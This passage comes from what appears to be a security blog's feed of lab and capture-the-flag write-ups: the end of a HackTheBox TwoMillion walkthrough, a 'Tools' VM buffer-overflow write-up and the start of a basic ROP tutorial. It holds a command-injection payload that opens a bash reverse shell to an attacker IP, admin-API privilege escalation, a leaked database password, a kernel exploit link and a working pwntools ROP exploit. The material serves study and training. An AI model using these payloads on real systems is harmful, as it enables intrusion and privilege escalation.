```bash
"admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
```

å› ä¸ºå®ƒå¯èƒ½å¯ä»¥å°†æ™®é€šç”¨æˆ·æ›´æ”¹ä¸ºé«˜æƒé™ç”¨æˆ·

è°ƒè¯•æ¥å£ï¼Œæˆ‘ä»¬ä¿®æ”¹ `Content-Type: application/json` æ—¶æç¤ºç¼ºå°‘å‚æ•° `email`

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image10.png)

æ·»åŠ  `email` åç¼ºå°‘ `is_admin` ï¼Œç»§ç»­è·Ÿç€è¡¥å…¨å‚æ•°

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image11.png)

è®¾ç½® `is_admin` ä¸º `1`

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image12.png)

æµ‹è¯•æ˜¯å¦ä¿®æ”¹æˆåŠŸï¼Œæˆ‘ä»¬å›åˆ°ç®¡ç†å‘˜æ¥å£ä¸­çš„`/api/v1/admin/auth` ï¼Œå›æ˜¾`True`

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image13.png)

å†è·å–ç®¡ç†å‘˜è´¦æˆ·çš„`VPN`

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image14.png)

é€šè¿‡å‘½ä»¤ä¹Ÿå¯ä»¥æ‹¿åˆ°

```bash
âœ  TwoMillion curl http://2million.htb/api/v1/admin/vpn/generate -X POST -H 'Cookie: PHPSESSID=ldkjilnio1ali642q30g4cs1p4' -H 'Content-Type: application/json' -d '{"username":"admin"}' -o admin.opvn
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10844    0 10824  100    20  19492     36 --:--:-- --:--:-- --:--:-- 19538
```

ä½†æ˜¯ç»è¿‡æµ‹è¯•ï¼Œç®¡ç†å‘˜çš„`opvn`æ–‡ä»¶ä¹Ÿæ˜¯æ— æ³•ä½¿ç”¨çš„

æµ‹è¯•åå‘ç°å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image15.png)

æˆ‘ä»¬é€šè¿‡æ¥åå¼¹`shell`

```bash
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Cookie: PHPSESSID=ldkjilnio1ali642q30g4cs1p4
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
DNT: 1
Referer: http://2million.htb/home/access
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json

{
    "username":"$(whoami;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.58/1234 0>&1')"
}
```

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image16.png)

## æƒé™æå‡

### Recon In www-data

æ’ä»¶ç›‘å¬ç«¯å£ï¼Œåœ¨å†…ç½‘ä¸­å‘å¸ƒäº†`mysql`å’Œ`Memcached`

```bash
www-data@2million:~/html$ ss -tulpn
Netid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process
udp     UNCONN   0        0          127.0.0.53%lo:53             0.0.0.0:*
udp     UNCONN   0        0                0.0.0.0:68             0.0.0.0:*
tcp     LISTEN   0        80             127.0.0.1:3306           0.0.0.0:*
tcp     LISTEN   0        1024           127.0.0.1:11211          0.0.0.0:*
tcp     LISTEN   0        511              0.0.0.0:80             0.0.0.0:*      users:(("nginx",pid=1198,fd=6))
tcp     LISTEN   0        4096       127.0.0.53%lo:53             0.0.0.0:*
tcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*
tcp     LISTEN   0        511                 [::]:80                [::]:*      users:(("nginx",pid=1198,fd=7))
tcp     LISTEN   0        128                 [::]:22                [::]:*
```

è·å– `Memcached` ä¸­çš„æ•°æ®ï¼Œå‘½ä»¤ç½‘ä¸ŠæŸ¥å³å¯

```bash
stats items               
STAT items:1:number 1   
STAT items:1:number_hot 0       
....
STAT items:4:evicted_unfetched 0
STAT items:4:evicted_active 0
```

```bash
stats cachedump 1 100
ITEM foo [3 b; 0 s]
END
stats cachedump 4 100
ITEM memc.sess.key.ldkjilnio1ali642q30g4cs1p4 [56 b; 1750433152 s]
END
```

```bash
get foo
VALUE foo 0 3
bar
END

get memc.sess.key.ldkjilnio1ali642q30g4cs1p4
VALUE memc.sess.key.ldkjilnio1ali642q30g4cs1p4 0 56
loggedin|b:1;id|i:13;username|s:6:"sunset";is_admin|i:1;
END
```

ä½†æ˜¯å¾—åˆ°ä¿¡æ¯è²Œä¼¼å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨

åœ¨å½“å‰ç›®å½•ä¸‹çš„`.env` ä¸­èƒ½æ‰¾åˆ° `admin` ç”¨æˆ·çš„å‡­æ®

```bash
www-data@2million:~/html$ cat .env 
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

æˆåŠŸç™»å½•è¿›å»

```bash
The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ 
```

è¯»å– `user.txt`

```bash
admin@2million:~$ cat user.txt 
e3c66af3c3a55bxxxxxxx
```

### Recon In admin

æˆ‘ä»¬ä»`banner`ä¿¡æ¯ä¸­èƒ½çœ‹åˆ°`admin`ç”¨æˆ·æœ‰ä¸€å°é‚®ä»¶

```bash
The list of available updates is more than a week old.
To check for new updates run: sudo apt update

***You have mail.***
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ 
```

```bash
admin@2million:/var/mail$ cat admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

> å—¨ï¼Œç®¡ç†å‘˜ï¼Œ
æˆ‘çŸ¥é“ä½ æ­£åœ¨å°½å¿«å®Œæˆæ•°æ®åº“è¿ç§»ã€‚è¶ç€æˆ‘ä»¬éƒ¨åˆ†æœåŠ¡å™¨å®•æœºï¼Œèƒ½ä¸èƒ½ä¹Ÿå‡çº§ä¸€ä¸‹æˆ‘ä»¬è™šæ‹Ÿä¸»æœºçš„æ“ä½œç³»ç»Ÿï¼Ÿä»Šå¹´å·²ç»å‡ºç°äº†å‡ ä¸ªä¸¥é‡çš„ Linux å†…æ ¸ CVE æ¼æ´ã€‚OverlayFS/FUSE çš„é‚£ä¸ªæ¼æ´çœ‹èµ·æ¥å¾ˆç³Ÿç³•ã€‚æˆ‘ä»¬ä¸èƒ½è¢«å®ƒç»™å‘äº†ã€‚
> 

### **CVE-2023-0386**

ç›´æ¥æ˜ç‰Œäº†

åˆ©ç”¨é“¾æ¥ï¼šhttps://github.com/xkaneiki/CVE-2023-0386

è·Ÿç€`Readme`æ•²å°±è¡Œ

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image17.png)

è¯»å– `root.txt`

```bash
root@2million:/root# cat root.txt 
c7bea054524b8584598731e5cb0441bb
```

## æ€»ç»“ & å°å½©è›‹

ä¸éš¾ï¼Œä½†æ˜¯æ­¥éª¤å¤šï¼Œåœ¨å‰æœŸéœ€è¦è¿›è¡Œå¾ˆå¤šæšä¸¾

`root`ç›®å½•ä¸‹`thank_you.json` æ˜¯ä¸€ä¸²åŠ å¯†åçš„æ•°æ®

```bash
root@2million:/root# cat thank_you.json 
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
```

å¯ä»¥é€šè¿‡è¿™ä¸ªæ­¥éª¤æ¥æ­ç§˜

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image18.png)

```bash
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackTheBox</category>
            <category>Linux</category>
            <category>FUZZ</category>
            <category>CVE-2023-0386</category>
        </item>
        <item>
            <title><![CDATA[ç¾¤Ué¶æœº - Tools]]></title>
            <link>https://www.sunsetaction.top/2025/06/16/ç¾¤Ué¶æœºTools</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/16/ç¾¤Ué¶æœºTools</guid>
            <pubDate>Mon, 16 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Tools Recon ç«¯å£æ‰«æ çˆ†ç ´ 1337 è®¿é—®80ç«¯å£æç¤º 1337 ç«¯å£æ˜¯è¦æˆ‘ä»¬è¾“å…¥ä»€ä¹ˆ AI è„šæœ¬ç›´æ¥çˆ†ç ´ å¾—åˆ°å‡­æ® welcome:learnpwntools ç¼“å†²åŒºæº¢å‡º æŸ¥çœ‹ sudo æƒé™ è¿è¡Œï¼Œå‘ç°ä¼šæœ‰ Segmentation fault æ‹‰å‡ºæ¥åç¼–è¯‘ä¸€çœ‹å­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´ æŸ¥...]]></description>
            <content:encoded><![CDATA[
# Tools

## Recon

ç«¯å£æ‰«æ

```bash
âœ  ~ nmap -sT -min-rate 5000 192.168.56.82
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 15:51 CST
Nmap scan report for 192.168.56.82
Host is up (0.00058s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:43:CC:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds
```

## çˆ†ç ´ 1337

è®¿é—®`80`ç«¯å£æç¤º

![image.png](/post-images/ç¾¤Ué¶æœºTools/image.png)

`1337` ç«¯å£æ˜¯è¦æˆ‘ä»¬è¾“å…¥ä»€ä¹ˆ

```bash
âœ  ~ nc 192.168.56.82 1337
Please input [152]: 152
Please input [921]: 921
Please input [441]: 441
Please input [105]: 105
Please input [534]: 534
Please input [192]: 192
Please input [626]: 626
Please input [968]: 968
Please input [674]: 674
Please input [494]: 494
Please input [768]: 768
Please input [808]: 808
Please input [365]: 365
Please input [438]: 438
Please input [975]: 975
Please input [165]: 165
Please input [796]: 796
Please input [892]:
```

`AI` è„šæœ¬ç›´æ¥çˆ†ç ´

```bash
import socket
import re
import time

# --- é…ç½® ---
HOST = '192.168.56.82'  # ç›®æ ‡æœåŠ¡å™¨ IP åœ°å€
PORT = 1337  # ç›®æ ‡æœåŠ¡å™¨ç«¯å£
# ------------

# æ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºä»æ–‡æœ¬ä¸­æå–æ–¹æ‹¬å·å†…çš„æ•°å­—
pattern = re.compile(r"\[(\d+)\]")

# å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œä»socketä¸­è¯»å–æ•°æ®ï¼Œç›´åˆ°é‡åˆ°ç‰¹å®šçš„åˆ†éš”ç¬¦
def read_until(sock, delimiter):
    """ä» sock ä¸­è¯»å–æ•°æ®ï¼Œç›´åˆ°æ¥æ”¶åˆ° delimiter ä¸ºæ­¢"""
    data = b""
    while not data.endswith(delimiter):
        try:
            # ä¸€æ¬¡åªè¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œé¿å…è¯»å–è¿‡å¤šå†…å®¹
            chunk = sock.recv(1)
            if not chunk:  # å¦‚æœè¿æ¥å…³é—­ï¼Œrecvä¼šè¿”å›ç©ºå­—èŠ‚ä¸²
                return data  # è¿”å›å·²æ¥æ”¶çš„æ•°æ®
            data += chunk
        except socket.timeout:
            # å¦‚æœå‘ç”Ÿè¶…æ—¶ï¼Œä¹Ÿè¿”å›å·²æ¥æ”¶çš„æ•°æ®
            print("\n[!] è¯»å–è¶…æ—¶")
            return data
    return data

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # è®¾ç½®ä¸€ä¸ªè¶…æ—¶ï¼Œé˜²æ­¢è„šæœ¬åœ¨ä»»ä½•recvæ“ä½œä¸Šæ°¸ä¹…å¡ä½
        s.settimeout(3)
        print(f"[*] è¿æ¥åˆ° {HOST}:{PORT}...")
        s.connect((HOST, PORT))
        print("[+] è¿æ¥æˆåŠŸï¼")

        while True:
            # è¯»å–æœåŠ¡å™¨çš„æç¤ºï¼Œç›´åˆ° ": " å‡ºç°
            # æˆ‘ä»¬ç”¨ b': ' æ˜¯å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªå­—èŠ‚å­—ç¬¦ä¸²
            prompt_bytes = read_until(s, b': ')

            # å¦‚æœè¯»å–åˆ°çš„æ•°æ®ä¸ºç©ºï¼Œè¯´æ˜è¿æ¥å¯èƒ½å·²æ–­å¼€
            if not prompt_bytes:
                print("\n[*] è¿æ¥å·²å…³é—­ã€‚")
                break

            # å°†å­—èŠ‚è§£ç ä¸ºå­—ç¬¦ä¸²ä»¥ä¾¿å¤„ç†
            prompt_str = prompt_bytes.decode('utf-8')
            print(f"[<] æ”¶åˆ°: {prompt_str}", end='')  # ç”¨ end='' é¿å…æ‰“å°å¤šä½™çš„æ¢è¡Œ

            # åœ¨æ”¶åˆ°çš„æç¤ºä¸­æŸ¥æ‰¾æ•°å­—
            match = pattern.search(prompt_str)

            if match:
                # æå–æ•°å­—
                number_to_send = match.group(1)

                # å‡†å¤‡è¦å‘é€çš„æ•°æ®ï¼ˆæ•°å­— + æ¢è¡Œç¬¦ï¼‰
                response = (number_to_send + '\n').encode('utf-8')

                print(f" [>] å‘é€: {number_to_send}")  # åœ¨åŒä¸€è¡Œæ‰“å°å‘é€å†…å®¹

                # å‘é€å“åº”
                s.sendall(response)

                # çŸ­æš‚å»¶è¿Ÿï¼Œæœ‰æ—¶å¯ä»¥é¿å…ç«æ€æ¡ä»¶
                time.sleep(0.1)
            else:
                # å¦‚æœåœ¨æç¤ºä¸­æ²¡æœ‰æ‰¾åˆ°æ•°å­—ï¼Œè¯´æ˜æŒ‘æˆ˜ç»“æŸäº†
                print("\n\n[*] æœªæ‰¾åˆ°æŒ‘æˆ˜æ•°å­—ï¼Œå‡å®šæŒ‘æˆ˜å·²å®Œæˆã€‚")
                print("[*] æœåŠ¡å™¨æœ€ç»ˆå“åº”ï¼š")
                print("====================================")
                print(prompt_str.strip())  # æ‰“å°æˆ‘ä»¬å·²æ”¶åˆ°çš„éƒ¨åˆ†

                # å°è¯•å†å¤šæ¥æ”¶ä¸€äº›æ•°æ®ï¼Œå› ä¸ºflagå¯èƒ½è·Ÿåœ¨åé¢
                try:
                    final_data = s.recv(4096).decode('utf-8').strip()
                    if final_data:
                        print(final_data)
                except socket.timeout:
                    pass  # æ²¡æœ‰æ›´å¤šæ•°æ®æ˜¯æ­£å¸¸çš„

                print("====================================")
                break

except ConnectionRefusedError:
    print(f"[!] è¿æ¥è¢«æ‹’ç»ã€‚è¯·æ£€æŸ¥ IP ({HOST}) å’Œç«¯å£ ({PORT})ã€‚")
except socket.timeout:
    print("[!] è¿æ¥è¶…æ—¶ã€‚æœåŠ¡å™¨æ²¡æœ‰åœ¨è§„å®šæ—¶é—´å†…å“åº”ã€‚")
except Exception as e:
    print(f"[!] å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")

print("[*] è„šæœ¬æ‰§è¡Œå®Œæ¯•ã€‚")

```

å¾—åˆ°å‡­æ® `welcome`:`learnpwntools`

```bash
[<] æ”¶åˆ°: Please input [407]:  [>] å‘é€: 407
[<] æ”¶åˆ°: Please input [510]:  [>] å‘é€: 510
[<] æ”¶åˆ°: user/pass:welcome/learnpwntools
```

## ç¼“å†²åŒºæº¢å‡º

æŸ¥çœ‹ `sudo` æƒé™

```bash
welcome@Tools:~$ sudo -l
Matching Defaults entries for welcome on Tools:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Tools:
    (ALL) NOPASSWD: /opt/find_backdoor
```

è¿è¡Œï¼Œå‘ç°ä¼šæœ‰ `Segmentation fault`

```bash
welcome@Tools:~$ /opt/find_backdoor       
please input                                      
111111111111111111111111111                                                                                       
ok,bye!!!111111111111111111111111111                                                                              
ok,bye!!!                                                                                                         
Segmentation fault 
```

æ‹‰å‡ºæ¥åç¼–è¯‘ä¸€çœ‹å­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´

![image.png](/post-images/ç¾¤Ué¶æœºTools/image1.png)

æŸ¥çœ‹å®‰å…¨æœºåˆ¶ï¼Œè£¸å¥”

```bash
welcome@Tools:~$ file /opt/find_backdoor 
/opt/find_backdoor: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped
welcome@Tools:~$ checksec /opt/find_backdoor 
[*] '/opt/find_backdoor'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

`shift+F12`æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå­˜åœ¨ `/bin/sh`

![image.png](/post-images/ç¾¤Ué¶æœºTools/image2.png)

æŸ¥çœ‹ `plt` ï¼Œæœ‰`system`å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥ç”¨

```bash
pwndbg> plt
Section .plt 0x401020 - 0x401060:
0x401030: puts@plt
0x401040: system@plt
0x401050: gets@plt
```

æœ‰ `system` å’Œ `/bin/sh` ï¼Œç›´æ¥æ¢­å“ˆ

è®¡ç®—åç§»å€¼ï¼Œå¾—åˆ°`23`

```bash
âœ  ttt /usr/bin/msf-pattern_create -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

```bash
pwndbg> x/xg 0x7fffffffdf58
0x7fffffffdf58: 0x3765413665413565
```

```bash
(pwn) âœ  ttt /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        
[*] Exact match at offset 23
```

æ‹¿ä¸€ä¸‹éœ€è¦ç”¨åˆ°çš„åœ°å€

```bash
welcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --string "/bin/sh"
Strings information
============================================================
0x000000000040201b : /bin/sh
```

```
welcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --only "pop|ret"
Gadgets information
============================================================
0x00000000004011fb : pop rdi ; ret
```

```bash
welcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --only "pop|ret"
Gadgets information
============================================================
0x0000000000401016 : ret
```

ç¼–å†™åˆ©ç”¨è„šæœ¬

```bash
from pwn import *
r = ssh(host='192.168.56.82', user='welcome', password='learnpwntools')
p = r.process(['sudo', '/opt/find_backdoor']) 
system_addr = 0x401040
bin_sh_addr = 0x000000000040201b
pop_rdi_addr = 0x00000000004011fb
ret = 0x0000000000401016

payload = b'A' * 23 + p64(ret) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)
p.sendlineafter(b'please input',payload)
p.interactive()
```

```bash
    IBT:      Disabled
[+] Starting remote process None on 192.168.56.82: pid 1105
[!] ASLR is disabled for '/opt/find_backdoor'!
[*] Switching to interactive mode

AAAAAAAAAAAAAAAAAAAAAAA\x16\x10@
ok,bye!!!
$ $ whoami
welcome
```

![image.png](/post-images/ç¾¤Ué¶æœºTools/image3.png)

![image.png](/post-images/ç¾¤Ué¶æœºTools/image4.png)]]></content:encoded>
            <category>é¶æœº</category>
            <category>PWN</category>
            <category>ROP</category>
            <category>ret2text</category>
            <category>Crack</category>
        </item>
        <item>
            <title><![CDATA[PWN - åŸºæœ¬ROP]]></title>
            <link>https://www.sunsetaction.top/2025/06/15/PWN - åŸºæœ¬ROP</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/15/PWN - åŸºæœ¬ROP</guid>
            <pubDate>Sat, 14 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[PWN åŸºæœ¬ROP https://ctf wiki.org/pwn/linux/user mode/stackoverflow/x86/basic rop/ è¿™é‡Œç”¨åˆ°çš„æ‰€æœ‰é¢˜ç›®ï¼šhttps://github.com/ctf wiki/ctf challenges/tree/master/pwn/l...]]></description>
            <content:encoded><![CDATA[
# PWN - åŸºæœ¬ROP

> https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/
> 

è¿™é‡Œç”¨åˆ°çš„æ‰€æœ‰é¢˜ç›®ï¼šhttps://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/

`HackTheBox - Ellingson` ç¢°åˆ°ç¼“å†²åŒºæº¢å‡ºï¼Œæ— ä»ä¸‹æ‰‹ï¼Œæ•…æœ‰æ­¤ç¯‡

## ret2text

`ret2text` å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (å³ï¼ŒÂ `.text`Â æ®µä¸­çš„ä»£ç )Â 

æ”¶æŸ¥çœ‹ç¨‹åºä¿æŠ¤æœºåˆ¶

```bash
âœ  ret2text checksec ret2text          
[*] '/root/Desktop/Test/StackBufferOverFlow/ret2text/ret2text'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```

ä»…ä»…å¼€å¯`NX` ï¼Œå¹¶ä¸”æ˜¯ `32` ä½ç¨‹åº

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image.png)

`gets`å‡½æ•°ï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œå¹¶ä¸”æ²¡æœ‰åšè¾¹ç•Œä¿æŠ¤

å¹¶ä¸”`secure`å‡½æ•°ä¸­æœ‰ `/bin/sh` 

```bash
void secure()
{
  unsigned int v0; // eax
  int input; // [esp+18h] [ebp-10h] BYREF
  int secretcode; // [esp+1Ch] [ebp-Ch]

  v0 = time(0);
  srand(v0);
  secretcode = rand();
  __isoc99_scanf(&unk_8048760, &input);
  if ( input == secretcode )
    system("/bin/sh");
}
```

å®šä½`system`å‡½æ•°

```bash
pwndbg> disas secure
Dump of assembler code for function secure:
   0x080485fd <+0>:     push   ebp
   0x080485fe <+1>:     mov    ebp,esp
   0x08048600 <+3>:     sub    esp,0x28
   0x08048603 <+6>:     mov    DWORD PTR [esp],0x0
   0x0804860a <+13>:    call   0x8048470 <time@plt>
   0x0804860f <+18>:    mov    DWORD PTR [esp],eax
   0x08048612 <+21>:    call   0x80484b0 <srand@plt>
   0x08048617 <+26>:    call   0x80484e0 <rand@plt>
   0x0804861c <+31>:    mov    DWORD PTR [ebp-0xc],eax
   0x0804861f <+34>:    lea    eax,[ebp-0x10]
   0x08048622 <+37>:    mov    DWORD PTR [esp+0x4],eax
   0x08048626 <+41>:    mov    DWORD PTR [esp],0x8048760
   0x0804862d <+48>:    call   0x80484f0 <__isoc99_scanf@plt>
   0x08048632 <+53>:    mov    eax,DWORD PTR [ebp-0x10]
   0x08048635 <+56>:    cmp    eax,DWORD PTR [ebp-0xc]
   0x08048638 <+59>:    jne    0x8048646 <secure+73>
   0x0804863a <+61>:    mov    DWORD PTR [esp],0x8048763
   0x08048641 <+68>:    call   0x8048490 <system@plt>
   0x08048646 <+73>:    leave
   0x08048647 <+74>:    ret
End of assembler dump.
```

åœ¨`0x0804863a`å¤„

æ¥ä¸‹æ¥è®¡ç®—åç§»é‡ï¼Œä½¿ç”¨ `pwndbg`

åç¼–è¯‘`main`æ‰¾åˆ°`gets` `0x080486ae`

```bash
pwndbg> disas main
Dump of assembler code for function main:
   0x08048648 <+0>:     push   ebp
   0x08048649 <+1>:     mov    ebp,esp
   0x0804864b <+3>:     and    esp,0xfffffff0
   0x0804864e <+6>:     add    esp,0xffffff80
   0x08048651 <+9>:     mov    eax,ds:0x804a060
   0x08048656 <+14>:    mov    DWORD PTR [esp+0xc],0x0
   0x0804865e <+22>:    mov    DWORD PTR [esp+0x8],0x2
   0x08048666 <+30>:    mov    DWORD PTR [esp+0x4],0x0
   0x0804866e <+38>:    mov    DWORD PTR [esp],eax
   0x08048671 <+41>:    call   0x80484d0 <setvbuf@plt>
   0x08048676 <+46>:    mov    eax,ds:0x804a040
   0x0804867b <+51>:    mov    DWORD PTR [esp+0xc],0x0
   0x08048683 <+59>:    mov    DWORD PTR [esp+0x8],0x1
   0x0804868b <+67>:    mov    DWORD PTR [esp+0x4],0x0
   0x08048693 <+75>:    mov    DWORD PTR [esp],eax
   0x08048696 <+78>:    call   0x80484d0 <setvbuf@plt>
   0x0804869b <+83>:    mov    DWORD PTR [esp],0x804876c
   0x080486a2 <+90>:    call   0x8048480 <puts@plt>
   0x080486a7 <+95>:    lea    eax,[esp+0x1c]
